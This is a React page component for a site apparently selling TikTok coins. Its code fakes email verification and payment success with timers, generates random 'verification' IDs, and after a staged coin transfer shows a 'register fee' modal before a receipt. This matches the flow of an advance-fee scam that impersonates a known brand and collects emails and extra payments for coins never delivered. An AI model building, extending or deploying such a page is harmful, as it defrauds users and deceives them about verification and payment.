"use client"

import { useState } from "react"
import { HeroSection } from "@/components/hero-section"
import { CoinsSection } from "@/components/coins-section"
import { VerificationModal } from "@/components/verification-modal"
import { PaymentSuccessfulModal } from "@/components/payment-successful-modal"
import { TransferProgressModal } from "@/components/transfer-progress-modal"
import { RegisterFeeModal } from "@/components/register-fee-modal"
import { ReceiptModal } from "@/components/receipt-modal"

export default function TikTokCoinsPage() {
  const [userEmail, setUserEmail] = useState("")
  const [isEmailVerified, setIsEmailVerified] = useState(false)
  const [showVerification, setShowVerification] = useState(false)
  const [showCoinsSection, setShowCoinsSection] = useState(false)
  const [selectedCoinData, setSelectedCoinData] = useState<{
    coins: number
    price: number
  } | null>(null)
  const [selectedPayment, setSelectedPayment] = useState<string | null>(null)
  const [showPaymentSuccess, setShowPaymentSuccess] = useState(false)
  const [showSendCoinsLoading, setShowSendCoinsLoading] = useState(false)
  const [showTransferProgress, setShowTransferProgress] = useState(false)
  const [showRegisterFee, setShowRegisterFee] = useState(false)
  const [showReceipt, setShowReceipt] = useState(false)
  const [verificationId, setVerificationId] = useState("")
  const [showError, setShowError] = useState(false)

  const generateVerificationId = () => {
    return `VER-${Math.random().toString(36).substring(2, 10).toUpperCase()}`
  }

  const handleEmailSubmit = (email: string) => {
    setUserEmail(email)
    setShowVerification(true)

    setTimeout(() => {
      setShowVerification(false)
      setIsEmailVerified(true)
      setShowCoinsSection(true)
    }, 2000)
  }

  const handleGetCoins = () => {
    if (!isEmailVerified) {
      setShowError(true)
      setTimeout(() => setShowError(false), 3000)
      return
    }
    setShowCoinsSection(true)
  }

  const handleBuyNow = () => {
    if (!isEmailVerified) {
      setShowError(true)
      setTimeout(() => {
        setShowError(false)
        setShowCoinsSection(false)
      }, 2000)
    }
  }

  const handleCoinSelect = (coins: number, price: number) => {
    setSelectedCoinData({ coins, price })
    setSelectedPayment(null)
  }

  const handlePaymentSelect = (method: string) => {
    setSelectedPayment(method)
  }

  const handlePayNow = () => {
    const vid = generateVerificationId()
    setVerificationId(vid)

    // Show loading for 2 seconds
    setTimeout(() => {
      setShowPaymentSuccess(true)
    }, 2000)
  }

  const handleSendCoins = () => {
    setShowSendCoinsLoading(true)
    setShowPaymentSuccess(false)

    setTimeout(() => {
      setShowSendCoinsLoading(false)
      setShowTransferProgress(true)
    }, 2000)
  }

  const handleTransferComplete = () => {
    setShowTransferProgress(false)
    setShowRegisterFee(true)
  }

  const handleRegisterFeePayment = () => {
    setShowRegisterFee(false)
    setShowReceipt(true)
  }

  const handleReceiptClose = () => {
    setShowReceipt(false)
    // Reset all states
    setSelectedCoinData(null)
    setSelectedPayment(null)
  }

  return (
    <div className="min-h-screen bg-black text-white">
      <HeroSection onEmailSubmit={handleEmailSubmit} showCoinsSection={showCoinsSection} onGetCoins={handleGetCoins} />

      <CoinsSection
        isVisible={showCoinsSection}
        selectedCoinData={selectedCoinData}
        selectedPayment={selectedPayment}
        onCoinSelect={handleCoinSelect}
        onPaymentSelect={handlePaymentSelect}
        onPayNow={handlePayNow}
        onBuyNow={handleBuyNow}
        isEmailVerified={isEmailVerified}
      />

      <VerificationModal isOpen={showVerification} />

      {showError && (
        <div className="fixed top-8 left-1/2 -translate-x-1/2 bg-red-600 text-white px-8 py-4 rounded-xl shadow-lg z-50 animate-in slide-in-from-top duration-300">
          <p className="font-semibold">Please verify your email first!</p>
        </div>
      )}

      {showSendCoinsLoading && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50">
          <div className="bg-gradient-to-br from-[#1a1a1a] to-[#0a0a0a] border-2 border-red-600 rounded-3xl p-12">
            <div className="w-32 h-32 animate-spin">
              <svg viewBox="0 0 100 100">
                <circle
                  cx="50"
                  cy="50"
                  r="45"
                  fill="none"
                  stroke="#dc2626"
                  strokeWidth="8"
                  strokeLinecap="round"
                  strokeDasharray="70 200"
                />
              </svg>
            </div>
          </div>
        </div>
      )}

      {selectedCoinData && (
        <>
          <PaymentSuccessfulModal
            isOpen={showPaymentSuccess}
            coins={selectedCoinData.coins}
            verificationId={verificationId}
            onSendCoins={handleSendCoins}
          />

          <TransferProgressModal
            isOpen={showTransferProgress}
            coins={selectedCoinData.coins}
            verificationId={verificationId}
            onComplete={handleTransferComplete}
          />

          <RegisterFeeModal
            isOpen={showRegisterFee}
            coins={selectedCoinData.coins}
            verificationId={verificationId}
            onPayRegisterFee={handleRegisterFeePayment}
          />

          <ReceiptModal
            isOpen={showReceipt}
            registeredName={userEmail.split("@")[0]}
            coins={selectedCoinData.coins}
            verificationId={verificationId}
            onClose={handleReceiptClose}
          />
        </>
      )}
    </div>
  )
}
